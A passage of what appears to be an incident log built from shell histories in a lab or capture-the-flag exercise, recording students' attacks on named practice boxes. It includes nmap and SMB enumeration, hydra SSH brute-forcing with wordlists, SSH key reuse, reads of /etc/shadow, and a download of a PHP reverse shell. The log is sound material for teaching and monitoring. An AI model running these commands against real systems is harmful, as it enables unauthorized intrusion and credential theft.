  - 2026-01-12T19:01:17 | logs/10.100.7.32/shell_history.csv#L83 | nmap -sV -p 1-65535 -T3 10.100.7.40
  - 2026-01-12T19:01:47 | logs/10.100.7.32/shell_history.csv#L84 | enum4linux -a 10.100.7.40

## Incident 429 - 2026-01-12T19:03:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-12T19:03:31 | logs/10.100.7.32/shell_history.csv#L86 | ping 10.100.7.43:5000
  - 2026-01-12T19:03:35 | logs/10.100.7.32/shell_history.csv#L87 | ping 10.100.7.43

## Incident 430 - 2026-01-12T19:06:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-12T19:06:32 | logs/10.100.7.14/shell_history.csv#L8 | enum4linux -a 10.100.7.43
  - 2026-01-12T19:06:58 | logs/10.100.7.14/shell_history.csv#L9 | ssh @10.100.7.43

## Incident 431 - 2026-01-12T19:10:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-12T19:10:53 | logs/10.100.7.32/shell_history.csv#L92 | nmap -sV -T3 10.100.7.40 10.100.7.41 10.100.7.42 10.100.7.43 -o nmap_log.txt
  - 2026-01-12T19:10:27 | logs/10.100.7.13/shell_history.csv#L15 | nmap -sV -p 1-3389 -T3 10.100.7.40

## Incident 432 - 2026-01-12T19:12:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-12T19:12:09 | logs/10.100.7.32/shell_history.csv#L93 | nmap -sV -T3 10.100.7.40 10.100.7.41 10.100.7.42 10.100.7.43 -o nmap_log.txt
  - 2026-01-12T19:12:32 | logs/10.100.7.32/shell_history.csv#L94 | nmap -sV -T3 10.100.7.40-43 -o nmap_log.txt
  - 2026-01-12T19:12:12 | logs/10.100.7.13/shell_history.csv#L16 | ssh @root 10.100.7.40
  - 2026-01-12T19:12:13 | logs/10.100.7.22/shell_history.csv#L12 | enum4linux  10.100.7.40

## Incident 433 - 2026-01-12T19:13:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:13:07 | logs/10.100.7.32/shell_history.csv#L95 | cat nmap_log.txt
  - 2026-01-12T19:13:14 | logs/10.100.7.14/shell_history.csv#L13 | exit

## Incident 434 - 2026-01-12T19:13:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-12T19:13:34 | logs/10.100.7.13/shell_history.csv#L17 | ssh root@ 10.100.7.40
  - 2026-01-12T19:13:44 | logs/10.100.7.22/shell_history.csv#L13 | smbclient -L //10.100.7.40 -U "

## Incident 435 - 2026-01-12T19:24:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:24:04 | logs/10.100.7.32/shell_history.csv#L96 | cat nmap_log.txt
  - 2026-01-12T19:24:04 | logs/10.100.7.32/shell_history.csv#L97 | ls
  - 2026-01-12T19:24:49 | logs/10.100.7.32/shell_history.csv#L98 | ls
  - 2026-01-12T19:24:53 | logs/10.100.7.32/shell_history.csv#L99 | ls
  - 2026-01-12T19:24:54 | logs/10.100.7.32/shell_history.csv#L100 | cd Documents
  - 2026-01-12T19:24:54 | logs/10.100.7.32/shell_history.csv#L101 | ls

## Incident 436 - 2026-01-12T19:25:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:25:25 | logs/10.100.7.32/shell_history.csv#L102 | vi helios_credentials.txt
  - 2026-01-12T19:25:11 | logs/10.100.7.13/shell_history.csv#L27 | hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10
  - 2026-01-12T19:25:25 | logs/10.100.7.22/shell_history.csv#L32 | cat maintenance.log

## Incident 437 - 2026-01-12T19:37:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:37:01 | logs/10.100.7.32/shell_history.csv#L111 | cat ~/.ssh/helios
  - 2026-01-12T19:37:05 | logs/10.100.7.32/shell_history.csv#L112 | cat ~/.ssh/helios
  - 2026-01-12T19:37:54 | logs/10.100.7.14/shell_history.csv#L21 | /api/health/all

## Incident 438 - 2026-01-12T19:38:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-12T19:38:24 | logs/10.100.7.32/shell_history.csv#L114 | ssh -i ~/.ssh/helios solaris@10.100.7.40
  - 2026-01-12T19:38:27 | logs/10.100.7.32/shell_history.csv#L115 | ssh -i ~/.ssh/helios solaris@10.100.7.40

## Incident 439 - 2026-01-12T19:38:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:38:29 | logs/10.100.7.32/shell_history.csv#L116 | cd ~/.ssh
  - 2026-01-12T19:38:29 | logs/10.100.7.32/shell_history.csv#L117 | ls
  - 2026-01-12T19:38:31 | logs/10.100.7.32/shell_history.csv#L118 | cat helios
  - 2026-01-12T19:38:38 | logs/10.100.7.32/shell_history.csv#L119 | mv helios helios_ssh_key
  - 2026-01-12T19:38:48 | logs/10.100.7.14/shell_history.csv#L22 | cd api

## Incident 440 - 2026-01-12T19:39:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:39:17 | logs/10.100.7.32/shell_history.csv#L120 | mv helios helios_ssh_key
  - 2026-01-12T19:39:18 | logs/10.100.7.32/shell_history.csv#L121 | mv helios helios_ssh_key

## Incident 441 - 2026-01-12T19:40:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-12T19:40:47 | logs/10.100.7.32/shell_history.csv#L125 | ssh -i ~/.ssh/helios_ssh_key solaris@10.100.7.40
  - 2026-01-12T19:40:51 | logs/10.100.7.32/shell_history.csv#L126 | ssh  solaris@10.100.7.40
  - 2026-01-12T19:40:55 | logs/10.100.7.32/shell_history.csv#L127 | ssh  solaris@10.100.7.40

## Incident 442 - 2026-01-12T19:42:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-12T19:42:17 | logs/10.100.7.32/shell_history.csv#L131 | ssh -i ~/.ssh/helios_ssh_key orbital@10.100.7.42
  - 2026-01-12T19:42:48 | logs/10.100.7.32/shell_history.csv#L132 | ssh -i ~/.ssh/helios_ssh_key orbital@10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 443 - 2026-01-12T19:50:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-12T19:50:17 | logs/10.100.7.32/shell_history.csv#L135 | ssh -i ~/.ssh/helios_ssh_key starfall@10.100.7.43
  - 2026-01-12T19:50:39 | logs/10.100.7.32/shell_history.csv#L136 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.43
  - 2026-01-12T19:50:46 | logs/10.100.7.32/shell_history.csv#L137 | ssh root@10.100.7.43

## Incident 444 - 2026-01-12T19:57:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:57:51 | logs/10.100.7.32/shell_history.csv#L144 | vi helios_credentials.txt
  - 2026-01-12T19:57:51 | logs/10.100.7.32/shell_history.csv#L145 | ls

## Incident 445 - 2026-01-12T19:59:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-12T19:59:26 | logs/10.100.7.32/shell_history.csv#L147 | hydra -l starfall -P helios_credentials.txt 10.100.7.43 -s ssh
  - 2026-01-12T19:59:40 | logs/10.100.7.32/shell_history.csv#L148 | hydra -l starfall -P helios_credentials.txt ssh://10.100.7.43
  - 2026-01-12T19:59:54 | logs/10.100.7.32/shell_history.csv#L149 | hydra -l starfall -P helios_credentials.txt ssh://10.100.7.43

## Incident 446 - 2026-01-12T20:02:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-12T20:02:08 | logs/10.100.7.32/shell_history.csv#L151 | ssh -i ~/.ssh/helios_ssh_key root @10.100.7.40
  - 2026-01-12T20:02:14 | logs/10.100.7.32/shell_history.csv#L152 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.40
  - 2026-01-12T20:02:17 | logs/10.100.7.32/shell_history.csv#L153 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.40

## Incident 447 - 2026-01-12T20:02:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T20:02:20 | logs/10.100.7.32/shell_history.csv#L154 | cat ~/.ssh/helios_ssh_key
  - 2026-01-12T20:02:35 | logs/10.100.7.32/shell_history.csv#L155 | cat ~/.ssh/helios_ssh_key
  - 2026-01-12T20:02:50 | logs/10.100.7.22/shell_history.csv#L47 | cat hashes.txt
  - 2026-01-12T20:02:52 | logs/10.100.7.22/shell_history.csv#L48 | cat hashes.txt

## Incident 448 - 2026-01-12T20:05:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-12T20:05:46 | logs/10.100.7.32/shell_history.csv#L159 | ssh -i ~/.ssh/helios_ssh_key starfall@10.100.7.43
  - 2026-01-12T20:05:57 | logs/10.100.7.32/shell_history.csv#L160 | ssh -i ~/.ssh/helios_ssh_key starfall@10.100.7.43

## Incident 449 - 2026-01-13T18:30:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:30:48 | logs/10.100.7.32/shell_history.csv#L161 | exit
  - 2026-01-13T18:30:52 | logs/10.100.7.32/shell_history.csv#L162 | exit
  - 2026-01-13T18:30:55 | logs/10.100.7.32/shell_history.csv#L163 | clear

## Incident 450 - 2026-01-13T18:31:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:31:51 | logs/10.100.7.32/shell_history.csv#L164 | clear
  - 2026-01-13T18:31:52 | logs/10.100.7.32/shell_history.csv#L165 | s
  - 2026-01-13T18:31:52 | logs/10.100.7.32/shell_history.csv#L166 | s
  - 2026-01-13T18:31:53 | logs/10.100.7.32/shell_history.csv#L167 | clear
  - 2026-01-13T18:31:53 | logs/10.100.7.32/shell_history.csv#L168 | ls

## Incident 451 - 2026-01-13T18:32:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:32:23 | logs/10.100.7.32/shell_history.csv#L169 | history | grep starfall
  - 2026-01-13T18:32:28 | logs/10.100.7.32/shell_history.csv#L170 | ls ~/.ssh/helios_ssh_key
  - 2026-01-13T18:32:33 | logs/10.100.7.32/shell_history.csv#L171 | cat ~/.ssh/helios_ssh_key

## Incident 452 - 2026-01-13T18:41:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:41:11 | logs/10.100.7.32/shell_history.csv#L173 | tldr
  - 2026-01-13T18:41:25 | logs/10.100.7.32/shell_history.csv#L174 | sudo apt install tldr
  - 2026-01-13T18:41:32 | logs/10.100.7.32/shell_history.csv#L175 | clear

## Incident 453 - 2026-01-13T18:42:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:42:11 | logs/10.100.7.32/shell_history.csv#L176 | sudo apt install tldr
  - 2026-01-13T18:42:31 | logs/10.100.7.32/shell_history.csv#L177 | sudo apt install tealdeer
  - 2026-01-13T18:42:34 | logs/10.100.7.32/shell_history.csv#L178 | tldr hydra
  - 2026-01-13T18:42:39 | logs/10.100.7.32/shell_history.csv#L179 | tldr --update
  - 2026-01-13T18:42:42 | logs/10.100.7.32/shell_history.csv#L180 | tldr hydra
  - 2026-01-13T18:42:54 | logs/10.100.7.32/shell_history.csv#L181 | tldr hydra | less
  - 2026-01-13T18:42:56 | logs/10.100.7.32/shell_history.csv#L182 | tldr less

## Incident 454 - 2026-01-13T18:43:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:43:18 | logs/10.100.7.32/shell_history.csv#L183 | tldr hydra | less
  - 2026-01-13T18:43:23 | logs/10.100.7.32/shell_history.csv#L184 | tldr vim
  - 2026-01-13T18:43:27 | logs/10.100.7.32/shell_history.csv#L185 | tldr vim
  - 2026-01-13T18:43:33 | logs/10.100.7.32/shell_history.csv#L186 | clear
  - 2026-01-13T18:43:33 | logs/10.100.7.32/shell_history.csv#L187 | ls
  - 2026-01-13T18:43:07 | logs/10.100.7.24/shell_history.csv#L7 | exit
  - 2026-01-13T18:43:07 | logs/10.100.7.24/shell_history.csv#L8 | exit
  - 2026-01-13T18:43:21 | logs/10.100.7.24/shell_history.csv#L9 | apt install tealdeer

## Incident 455 - 2026-01-13T18:44:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:44:05 | logs/10.100.7.32/shell_history.csv#L188 | tldr netexec
  - 2026-01-13T18:44:07 | logs/10.100.7.32/shell_history.csv#L189 | nxc
  - 2026-01-13T18:44:10 | logs/10.100.7.32/shell_history.csv#L190 | tldr nxc
  - 2026-01-13T18:44:17 | logs/10.100.7.32/shell_history.csv#L191 | man nxc
  - 2026-01-13T18:44:22 | logs/10.100.7.32/shell_history.csv#L192 | nxc --help
  - 2026-01-13T18:44:24 | logs/10.100.7.32/shell_history.csv#L193 | clear
  - 2026-01-13T18:44:39 | logs/10.100.7.32/shell_history.csv#L195 | tldr nxc

## Incident 456 - 2026-01-13T18:44:00
- Target IP: 10.100.62.83
- Target Box: None
- Entries:
  - 2026-01-13T18:44:32 | logs/10.100.7.32/shell_history.csv#L194 | nmap -p 445 10.100.62.83
  - 2026-01-13T18:44:35 | logs/10.100.7.24/shell_history.csv#L10 | nmap 10.100.62.83

## Incident 457 - 2026-01-13T18:46:00
- Target IP: 10.100.62.83
- Target Box: None
- Entries:
  - 2026-01-13T18:46:02 | logs/10.100.7.32/shell_history.csv#L197 | nxc smb 10.100.62.83 -u guest -p ''
  - 2026-01-13T18:46:30 | logs/10.100.7.32/shell_history.csv#L198 | nxc smb 10.100.62.83 -u guest -p '' --list-modules
  - 2026-01-13T18:46:20 | logs/10.100.7.14/shell_history.csv#L28 | nxc smb 10.100.62.83 -u guest -p '' --shares
  - 2026-01-13T18:46:01 | logs/10.100.7.24/shell_history.csv#L12 | smb 10.100.62.83 -u guest -p ''
  - 2026-01-13T18:46:50 | logs/10.100.7.24/shell_history.csv#L13 | nxc smb 10.100.62.83 -u guest -p ''

## Incident 458 - 2026-01-13T18:46:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:46:39 | logs/10.100.7.32/shell_history.csv#L199 | nxc --list-modules
  - 2026-01-13T18:46:44 | logs/10.100.7.32/shell_history.csv#L200 | nxc smb --list-modules

## Incident 459 - 2026-01-13T18:46:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T18:46:39 | logs/10.100.7.22/shell_history.csv#L52 | ssh kali@10.100.7.40
  - 2026-01-13T18:46:52 | logs/10.100.7.22/shell_history.csv#L53 | ssh kali@10.100.7.40

## Incident 460 - 2026-01-13T18:47:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:47:17 | logs/10.100.7.32/shell_history.csv#L201 | nxc smb --list-modules | less
  - 2026-01-13T18:47:18 | logs/10.100.7.32/shell_history.csv#L202 | clear
  - 2026-01-13T18:47:18 | logs/10.100.7.32/shell_history.csv#L203 | ls
  - 2026-01-13T18:47:23 | logs/10.100.7.32/shell_history.csv#L204 | tldr smbclient
  - 2026-01-13T18:47:28 | logs/10.100.7.22/shell_history.csv#L55 | man smb
  - 2026-01-13T18:47:59 | logs/10.100.7.22/shell_history.csv#L56 | man smbClient
  - 2026-01-13T18:47:36 | logs/10.100.7.24/shell_history.csv#L14 | apt install tealdeer

## Incident 461 - 2026-01-13T18:49:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:49:13 | logs/10.100.7.14/shell_history.csv#L29 | smbclient//server/share--user Anon
  - 2026-01-13T18:49:37 | logs/10.100.7.14/shell_history.csv#L30 | smbclient//server/share--user guest
  - 2026-01-13T18:49:54 | logs/10.100.7.14/shell_history.csv#L31 | smbclient
  - 2026-01-13T18:49:44 | logs/10.100.7.24/shell_history.csv#L17 | unzip backup.zip
  - 2026-01-13T18:49:50 | logs/10.100.7.24/shell_history.csv#L18 | cat credentials.txt

## Incident 462 - 2026-01-13T18:50:00
- Target IP: 10.100.62.83
- Target Box: None
- Entries:
  - 2026-01-13T18:50:23 | logs/10.100.7.32/shell_history.csv#L208 | nxc smb 10.100.62.83 -u guest -p ''
  - 2026-01-13T18:50:57 | logs/10.100.7.24/shell_history.csv#L19 | nxc smb 10.100.62.83 -u guest -p ''

## Incident 463 - 2026-01-13T18:53:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:53:10 | logs/10.100.7.32/shell_history.csv#L210 | ls
  - 2026-01-13T18:53:11 | logs/10.100.7.32/shell_history.csv#L211 | ls
  - 2026-01-13T18:53:18 | logs/10.100.7.32/shell_history.csv#L212 | tar xvf /usr/share/wordlists/rockyou.txt.gz
  - 2026-01-13T18:53:25 | logs/10.100.7.32/shell_history.csv#L213 | cat /usr/share/wordlists/rockyou.txt.gz
  - 2026-01-13T18:53:26 | logs/10.100.7.32/shell_history.csv#L214 | clear
  - 2026-01-13T18:53:26 | logs/10.100.7.32/shell_history.csv#L215 | ls
  - 2026-01-13T18:53:29 | logs/10.100.7.32/shell_history.csv#L216 | ls
  - 2026-01-13T18:53:32 | logs/10.100.7.32/shell_history.csv#L217 | tldr tar
  - 2026-01-13T18:53:43 | logs/10.100.7.32/shell_history.csv#L218 | tldr tar
  - 2026-01-13T18:53:45 | logs/10.100.7.32/shell_history.csv#L219 | tldr tar

## Incident 464 - 2026-01-13T18:54:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:54:59 | logs/10.100.7.32/shell_history.csv#L220 | tldr tar
  - 2026-01-13T18:54:59 | logs/10.100.7.14/shell_history.csv#L32 | sudo apt install teeldeer

## Incident 465 - 2026-01-13T18:55:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T18:55:01 | logs/10.100.7.32/shell_history.csv#L221 | ls /usr/share/wordlists
  - 2026-01-13T18:55:05 | logs/10.100.7.32/shell_history.csv#L222 | ls /usr/share/wordlists
  - 2026-01-13T18:55:08 | logs/10.100.7.32/shell_history.csv#L223 | ls -la /usr/share/wordlists
  - 2026-01-13T18:55:21 | logs/10.100.7.32/shell_history.csv#L224 | gunzip /usr/share/wordlists/rockyou.txt.gz
  - 2026-01-13T18:55:23 | logs/10.100.7.32/shell_history.csv#L225 | gunzip /usr/share/wordlists/rockyou.txt.gz
  - 2026-01-13T18:55:27 | logs/10.100.7.32/shell_history.csv#L226 | sudo gunzip /usr/share/wordlists/rockyou.txt.gz
  - 2026-01-13T18:55:30 | logs/10.100.7.32/shell_history.csv#L227 | ls /usr/share/wordlists
  - 2026-01-13T18:55:36 | logs/10.100.7.32/shell_history.csv#L228 | ls /usr/share/wordlists
  - 2026-01-13T18:55:40 | logs/10.100.7.32/shell_history.csv#L229 | cat /usr/share/wordlists/rockyou.txt
  - 2026-01-13T18:55:41 | logs/10.100.7.32/shell_history.csv#L230 | clear
  - 2026-01-13T18:55:41 | logs/10.100.7.32/shell_history.csv#L231 | ls
  - 2026-01-13T18:55:27 | logs/10.100.7.14/shell_history.csv#L33 | sudo apt install tealdeer

## Incident 466 - 2026-01-13T19:00:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:00:04 | logs/10.100.7.32/shell_history.csv#L233 | history | grep starfall
  - 2026-01-13T19:00:06 | logs/10.100.7.32/shell_history.csv#L234 | history | grep starfall
  - 2026-01-13T19:00:33 | logs/10.100.7.32/shell_history.csv#L235 | history | grep starfall
  - 2026-01-13T19:00:37 | logs/10.100.7.32/shell_history.csv#L236 | history | grep starfall

## Incident 467 - 2026-01-13T19:26:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:26:11 | logs/10.100.7.32/shell_history.csv#L243 | clear
  - 2026-01-13T19:26:12 | logs/10.100.7.32/shell_history.csv#L244 | clear
  - 2026-01-13T19:26:12 | logs/10.100.7.32/shell_history.csv#L245 | ls

## Incident 468 - 2026-01-13T19:26:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-13T19:26:39 | logs/10.100.7.14/shell_history.csv#L44 | ssh starfall@10.100.7.43
  - 2026-01-13T19:26:58 | logs/10.100.7.14/shell_history.csv#L45 | ssh scoring_user@10.100.7.43
  - 2026-01-13T19:26:59 | logs/10.100.7.14/shell_history.csv#L46 | ssh scoring_user@10.100.7.43

## Incident 469 - 2026-01-13T19:32:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:32:24 | logs/10.100.7.13/shell_history.csv#L52 | tldr smbclient.py
  - 2026-01-13T19:32:29 | logs/10.100.7.13/shell_history.csv#L53 | tldr smbclient
  - 2026-01-13T19:32:54 | logs/10.100.7.13/shell_history.csv#L54 | tldr --update

## Incident 470 - 2026-01-13T19:48:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-13T19:48:02 | logs/10.100.7.32/shell_history.csv#L308 | smbclient //10.100.7.43 -u guest
  - 2026-01-13T19:48:05 | logs/10.100.7.32/shell_history.csv#L309 | smbclient //10.100.7.43 -user guest
  - 2026-01-13T19:48:11 | logs/10.100.7.32/shell_history.csv#L310 | smbclient //10.100.7.43 -user guest
  - 2026-01-13T19:48:31 | logs/10.100.7.32/shell_history.csv#L312 | smbclient //10.100.7.43/public -user guest

## Incident 471 - 2026-01-13T20:15:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T20:15:00 | logs/10.100.7.32/shell_history.csv#L354 | nxc smb 10.100.7.40 -u guest -p ''
  - 2026-01-13T20:15:06 | logs/10.100.7.32/shell_history.csv#L355 | nxc smb 10.100.7.40 -u guest -p '' --shares

## Incident 472 - 2026-01-13T20:15:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T20:15:42 | logs/10.100.7.24/shell_history.csv#L83 | enum4linux -a -u orbital -p securepassword 10.100.7.42
  - 2026-01-13T20:15:42 | logs/10.100.7.24/shell_history.csv#L84 | enum4linux -a -u orbital -p securepassword 10.100.7.42
  - 2026-01-13T20:15:42 | logs/10.100.7.24/shell_history.csv#L85 | enum4linux -a -u orbital -p securepassword 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 473 - 2026-01-13T20:18:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T20:18:36 | logs/10.100.7.32/shell_history.csv#L356 | nxc smb 10.100.7.42 -u guest -p '' --shares
  - 2026-01-13T20:18:40 | logs/10.100.7.32/shell_history.csv#L357 | nxc smb 10.100.7.42 -u guest -p '' --shares
  - 2026-01-13T20:18:52 | logs/10.100.7.32/shell_history.csv#L358 | smbclient //10.100.7.42/IPC --user guest
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 474 - 2026-01-13T20:18:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-01-13T20:18:42 | logs/10.100.7.24/shell_history.csv#L86 | enum4linux -a 10.100.7.41
  - 2026-01-13T20:18:43 | logs/10.100.7.24/shell_history.csv#L87 | enum4linux -a 10.100.7.41

## Incident 475 - 2026-01-13T20:19:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T20:19:03 | logs/10.100.7.32/shell_history.csv#L359 | smbclient //10.100.7.42/IPC$ --user guest
  - 2026-01-13T20:19:11 | logs/10.100.7.32/shell_history.csv#L360 | smbclient //10.100.7.42/C$ --user guest
  - 2026-01-13T20:19:17 | logs/10.100.7.32/shell_history.csv#L361 | smbclient //10.100.7.42/C$ --user guest
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 476 - 2026-01-13T20:19:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T20:19:59 | logs/10.100.7.13/shell_history.csv#L82 | smbclient //orbital/public --user guest
  - 2026-01-13T20:19:49 | logs/10.100.7.22/shell_history.csv#L74 | ls

## Incident 477 - 2026-01-13T20:19:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-13T20:19:05 | logs/10.100.7.24/shell_history.csv#L88 | enum4linux -a 10.100.7.43
  - 2026-01-13T20:19:05 | logs/10.100.7.24/shell_history.csv#L89 | enum4linux -a 10.100.7.43

## Incident 478 - 2026-01-20T18:35:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T18:35:17 | logs/10.100.7.32/shell_history.csv#L364 | exit
  - 2026-01-20T18:35:19 | logs/10.100.7.32/shell_history.csv#L365 | clear
  - 2026-01-20T18:35:19 | logs/10.100.7.32/shell_history.csv#L366 | ls

## Incident 479 - 2026-01-20T18:43:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T18:43:01 | logs/10.100.7.32/shell_history.csv#L369 | cat /etc/shadow
  - 2026-01-20T18:43:02 | logs/10.100.7.32/shell_history.csv#L370 | sudo cat /etc/shadow

## Incident 480 - 2026-01-20T18:48:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T18:48:10 | logs/10.100.7.32/shell_history.csv#L373 | su -i
  - 2026-01-20T18:48:15 | logs/10.100.7.32/shell_history.csv#L374 | sudo -i
  - 2026-01-20T18:48:15 | logs/10.100.7.32/shell_history.csv#L375 | ls
  - 2026-01-20T18:48:32 | logs/10.100.7.32/shell_history.csv#L376 | cat /etc/cronjob
  - 2026-01-20T18:48:35 | logs/10.100.7.32/shell_history.csv#L377 | cat /etc/crontab

## Incident 481 - 2026-01-20T18:55:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T18:55:08 | logs/10.100.7.32/shell_history.csv#L378 | history
  - 2026-01-20T18:55:08 | logs/10.100.7.32/shell_history.csv#L379 | clear
  - 2026-01-20T18:55:09 | logs/10.100.7.32/shell_history.csv#L380 | ls
  - 2026-01-20T18:55:59 | logs/10.100.7.32/shell_history.csv#L381 | cd .ssh

## Incident 482 - 2026-01-20T18:56:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T18:56:00 | logs/10.100.7.32/shell_history.csv#L382 | ls
  - 2026-01-20T18:56:07 | logs/10.100.7.32/shell_history.csv#L383 | tldr ssh-keygen
  - 2026-01-20T18:56:24 | logs/10.100.7.32/shell_history.csv#L384 | ssh-keygen -y -f ~/.ssh/helios_ssh_key
  - 2026-01-20T18:56:26 | logs/10.100.7.32/shell_history.csv#L385 | ls
  - 2026-01-20T18:56:36 | logs/10.100.7.32/shell_history.csv#L386 | ssh-keygen -y -f ~/.ssh/helios_ssh_key > helios_ssh_key.pub
  - 2026-01-20T18:56:38 | logs/10.100.7.32/shell_history.csv#L387 | ls
  - 2026-01-20T18:56:40 | logs/10.100.7.32/shell_history.csv#L388 | cat helios_ssh_key.pub
  - 2026-01-20T18:56:42 | logs/10.100.7.32/shell_history.csv#L389 | clear

## Incident 483 - 2026-01-20T19:04:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:04:39 | logs/10.100.7.32/shell_history.csv#L390 | wget https://github.com/pentestmonkey/php-reverse-shell/raw/refs/heads/master/php-reverse-shell.php
  - 2026-01-20T19:04:40 | logs/10.100.7.32/shell_history.csv#L391 | ls
  - 2026-01-20T19:04:44 | logs/10.100.7.32/shell_history.csv#L392 | mv php-reverse-shell.php ~/Downloads
  - 2026-01-20T19:04:44 | logs/10.100.7.32/shell_history.csv#L393 | ls
  - 2026-01-20T19:04:47 | logs/10.100.7.32/shell_history.csv#L394 | cd ~/Downloads
  - 2026-01-20T19:04:47 | logs/10.100.7.32/shell_history.csv#L395 | ls

## Incident 484 - 2026-01-20T19:06:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:06:01 | logs/10.100.7.32/shell_history.csv#L398 | mv php-reverse-shell.php test2.txt
  - 2026-01-20T19:06:01 | logs/10.100.7.32/shell_history.csv#L399 | ls
  - 2026-01-20T19:06:48 | logs/10.100.7.32/shell_history.csv#L400 | vi test2.txt

## Incident 485 - 2026-01-20T19:07:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-20T19:07:01 | logs/10.100.7.32/shell_history.csv#L401 | ssh www-data@http://10.100.7.40/
  - 2026-01-20T19:07:07 | logs/10.100.7.32/shell_history.csv#L402 | ssh www-data@10.100.7.40

## Incident 486 - 2026-01-20T19:07:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:07:08 | logs/10.100.7.32/shell_history.csv#L403 | ls
  - 2026-01-20T19:07:58 | logs/10.100.7.32/shell_history.csv#L404 | ls

## Incident 487 - 2026-01-20T19:08:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:08:00 | logs/10.100.7.32/shell_history.csv#L405 | history | grep ssh
  - 2026-01-20T19:08:18 | logs/10.100.7.22/shell_history.csv#L83 | vim privatekey.txt
  - 2026-01-20T19:08:33 | logs/10.100.7.22/shell_history.csv#L84 | cd .ssh
  - 2026-01-20T19:08:35 | logs/10.100.7.22/shell_history.csv#L85 | ls

## Incident 488 - 2026-01-20T19:16:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-20T19:16:32 | logs/10.100.7.32/shell_history.csv#L406 | ssh -i ~/.ssh/helios_ssh_key starfall@10.100.7.43
  - 2026-01-20T19:16:42 | logs/10.100.7.32/shell_history.csv#L407 | ssh -i ~/.ssh/helios_ssh_key starfall@10.100.7.43

## Incident 489 - 2026-01-20T19:16:00
